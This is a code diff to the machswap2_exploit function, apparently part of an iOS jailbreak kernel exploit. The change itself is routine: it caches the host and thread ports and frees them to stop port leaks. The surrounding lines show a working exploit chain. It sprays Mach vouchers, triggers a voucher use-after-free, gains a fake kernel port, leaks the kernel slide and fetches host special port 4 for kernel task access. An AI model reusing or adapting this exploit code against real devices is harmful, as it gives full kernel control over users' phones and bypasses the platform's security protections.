@@ -693,10 +693,17 @@ kern_return_t machswap2_exploit(machswap_offsets_t *offsets, task_t *tfp0_back, 
     int *pipefds = NULL;
     int total_pipes = 0;
     
+    host_t host = HOST_NULL;
+    host_t original_host = HOST_NULL;
+    thread_t thread = THREAD_NULL;
+    
     /********** ********** data hunting ********** **********/
 
+    host = mach_host_self();
+    original_host = host;
+    thread = mach_thread_self();
     vm_size_t pgsz = 0;
-    ret = _host_page_size(mach_host_self(), &pgsz);
+    ret = _host_page_size(host, &pgsz);
     pagesize = pgsz;
     LOG("page size: 0x%llx, %s", pagesize, mach_error_string(ret));
     if (ret != KERN_SUCCESS)
@@ -872,25 +879,25 @@ kern_return_t machswap2_exploit(machswap_offsets_t *offsets, task_t *tfp0_back, 
     };
 
     mach_port_t p2;
-    ret = host_create_mach_voucher(mach_host_self(), (mach_voucher_attr_raw_recipe_array_t)&atm_data, sizeof(atm_data), &p2);
+    ret = host_create_mach_voucher(host, (mach_voucher_attr_raw_recipe_array_t)&atm_data, sizeof(atm_data), &p2);
     
     mach_port_t p3;
-    ret = host_create_mach_voucher(mach_host_self(), (mach_voucher_attr_raw_recipe_array_t)&atm_data, sizeof(atm_data), &p3);
+    ret = host_create_mach_voucher(host, (mach_voucher_attr_raw_recipe_array_t)&atm_data, sizeof(atm_data), &p3);
 
     /* allocate 0x2000 vouchers to alloc some new fresh pages */
     for (int i = 0; i < 0x2000; i++)
     {
-        ret = host_create_mach_voucher(mach_host_self(), (mach_voucher_attr_raw_recipe_array_t)&atm_data, sizeof(atm_data), &before[i]);
+        ret = host_create_mach_voucher(host, (mach_voucher_attr_raw_recipe_array_t)&atm_data, sizeof(atm_data), &before[i]);
     }
     
     /* alloc our target uaf voucher */
     mach_port_t p1;
-    ret = host_create_mach_voucher(mach_host_self(), (mach_voucher_attr_raw_recipe_array_t)&atm_data, sizeof(atm_data), &p1);
+    ret = host_create_mach_voucher(host, (mach_voucher_attr_raw_recipe_array_t)&atm_data, sizeof(atm_data), &p1);
     
     /* allocate 0x1000 more vouchers */
     for (int i = 0; i < 0x1000; i++)
     {
-        ret = host_create_mach_voucher(mach_host_self(), (mach_voucher_attr_raw_recipe_array_t)&atm_data, sizeof(atm_data), &after[i]);
+        ret = host_create_mach_voucher(host, (mach_voucher_attr_raw_recipe_array_t)&atm_data, sizeof(atm_data), &after[i]);
     }
 
     /*
@@ -910,7 +917,7 @@ kern_return_t machswap2_exploit(machswap_offsets_t *offsets, task_t *tfp0_back, 
     */
     
     /* set up to trigger the bug */
-    ret = thread_set_mach_voucher(mach_thread_self(), p1);
+    ret = thread_set_mach_voucher(thread, p1);
     
     ret = task_swap_mach_voucher(mach_task_self(), p1, &p2);
     
@@ -966,7 +973,7 @@ kern_return_t machswap2_exploit(machswap_offsets_t *offsets, task_t *tfp0_back, 
     }
 
     /* fingers crossed we get a userland handle onto our 'fakeport' object */
-    ret = thread_get_mach_voucher(mach_thread_self(), 0, &real_port_to_fake_voucher);
+    ret = thread_get_mach_voucher(thread, 0, &real_port_to_fake_voucher);
 
     for (int i = 0; i < sizeof(postport) / sizeof(mach_port_t); i++)
     {
@@ -1123,7 +1130,7 @@ found_voucher_lbl:;
     }
 
     mach_port_t old_real_port = real_port_to_fake_voucher;
-    ret = thread_get_mach_voucher(mach_thread_self(), 0, &real_port_to_fake_voucher);
+    ret = thread_get_mach_voucher(thread, 0, &real_port_to_fake_voucher);
     if (ret != KERN_SUCCESS)
     {
         LOG("failed to call thread_get_mach_voucher: %x %s", ret, mach_error_string(ret));
@@ -1350,7 +1357,7 @@ value = value | ((uint64_t)read64_tmp << 32);\
     LOG("kslide: 0x%llx", kslide);
 
     /* find realhost */
-    ret = send_port(the_one, mach_host_self());
+    ret = send_port(the_one, host);
     if (ret != KERN_SUCCESS)
     {
         LOG("failed to send_port: %x %s", ret, mach_error_string(ret));
@@ -1571,8 +1578,11 @@ value = value | ((uint64_t)read64_tmp << 32);\
         goto out;
     }
 
+    host = mach_host_self();
     mach_port_t hsp4;
-    ret = host_get_special_port(mach_host_self(), HOST_LOCAL_NODE, 4, &hsp4);
+    ret = host_get_special_port(host, HOST_LOCAL_NODE, 4, &hsp4);
+    mach_port_deallocate(mach_host_self(), host);
+    host = original_host;
     
     /* de-elevate */
 
@@ -1648,6 +1658,17 @@ out:;
     
     if (pipefds) {
         free((void *)pipefds);
+    }
+    
+    if (MACH_PORT_VALID(host)) {
+        mach_port_deallocate(mach_task_self(), host);
+        host = HOST_NULL;
+        original_host = HOST_NULL;
+    }
+    
+    if (MACH_PORT_VALID(thread)) {
+        mach_port_deallocate(mach_task_self(), thread);
+        thread = THREAD_NULL;
     }
 
     return ret;
